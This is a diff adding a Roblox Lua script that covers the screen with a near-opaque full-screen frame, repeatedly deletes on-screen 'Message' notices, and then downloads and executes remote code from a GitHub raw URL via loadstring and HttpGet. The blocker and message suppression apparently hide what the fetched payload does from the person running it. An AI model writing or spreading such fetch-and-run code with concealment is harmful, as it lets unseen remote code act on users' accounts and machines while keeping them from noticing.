@@ -1,0 +1,30 @@
+local blocker = Instance.new("Frame")
+blocker.Name = "Sybau"
+blocker.Size = UDim2.new(1.5, 0, 1.5, 0)
+blocker.Position = UDim2.new(-0.25, 0, -0.25, 0)
+blocker.BackgroundColor3 = Color3.new(0.5, 0, 0)
+blocker.BackgroundTransparency = 0.03
+blocker.ZIndex = 999 
+blocker.BorderSizePixel = 0
+
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "Sybau"
+screenGui.DisplayOrder = 999
+screenGui.ResetOnSpawn = false
+screenGui.IgnoreGuiInset = true
+screenGui.Parent = game:GetService("CoreGui")
+blocker.Parent = screenGui
+
+task.spawn(function()
+    while true do
+        for _, obj in pairs(game:GetService("CoreGui"):GetDescendants()) do
+            if obj.Name == "Message" then
+                obj:Destroy()
+            end
+        end
+        task.wait()
+    end
+end)
+
+-- ===== LOAD YOUR SCRIPT =====
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HeadHarse/Things/refs/heads/main/BA"))()
